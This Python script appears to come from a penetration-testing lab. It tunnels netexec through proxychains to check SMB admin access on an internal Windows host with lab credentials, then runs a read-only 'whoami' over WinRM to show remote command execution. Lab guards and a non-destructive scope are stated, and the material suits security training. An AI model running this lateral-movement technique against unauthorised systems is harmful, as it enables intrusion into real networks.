#!/usr/bin/env python3
"""
lateral_movement_lab.py — Phase 8. Demonstrate NON-DESTRUCTIVE lateral movement
to the internal Windows target through the tunnel, using the lab credentials.

What it does (and ONLY this):
  1. Authenticate over SMB (shows whether creds grant admin => 'Pwn3d!').
  2. Run a harmless read-only command over WinRM (whoami; hostname).

What it deliberately does NOT do: no payloads, no persistence, no credential
dumping, no file writes on the target, no destructive actions.

Usage:  python3 lateral_movement_lab.py
SAFETY: lab-validated target + lab-only credentials, both from lab_config.
"""
import os
import shutil
import subprocess
import sys

from lab_config import (HOSTS, LAB_CREDS, assert_lab_target, get_logger, banner)

log = get_logger("lateral_movement_lab")
CONF = os.path.expanduser("~/pc.conf")
READONLY_CMD = "whoami; hostname; echo LAB-LATERAL-MOVEMENT-OK"


def _tools():
    pc = shutil.which("proxychains4") or shutil.which("proxychains")
    nxc = shutil.which("nxc") or shutil.which("netexec") or shutil.which("crackmapexec")
    return pc, nxc


def run(cmd, timeout=120):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return "(timed out)"


def main():
    ip = HOSTS["windows"]
    assert_lab_target(ip)
    print(banner("LATERAL MOVEMENT (lab, non-destructive)"))
    log.info("Target: %s   User: %s   (lab-only credentials)", ip, LAB_CREDS["username"])

    pc, nxc = _tools()
    if not (pc and nxc):
        log.error("Need proxychains and nxc/netexec.")
        return 2
    u, p = LAB_CREDS["username"], LAB_CREDS["password"]

    log.info("Step 1/2 — SMB authentication check")
    smb = run([pc, "-f", CONF, nxc, "smb", ip, "-u", u, "-p", p])
    log.info("\n%s", smb)
    admin = "Pwn3d!" in smb
    log.info("  => %s", "ADMIN access (Pwn3d!)" if admin else "authenticated (non-admin or failed)")

    log.info("Step 2/2 — read-only command via WinRM (single-port, tunnel-friendly)")
    winrm = run([pc, "-f", CONF, nxc, "winrm", ip, "-u", u, "-p", p, "-X", READONLY_CMD])
    log.info("\n%s", winrm)
    rce = "Executed command" in winrm or "LAB-LATERAL-MOVEMENT-OK" in winrm

    print(banner("LATERAL MOVEMENT SUMMARY"))
    log.info("  SMB admin (Pwn3d!) : %s", admin)
    log.info("  WinRM RCE (read-only): %s", rce)
    log.info("  Security impact: a weak local-admin credential + exposed WinRM")
    log.info("  allowed full control of an internal host reached only via the pivot.")
    return 0 if (admin or rce) else 1


if __name__ == "__main__":
    sys.exit(main())
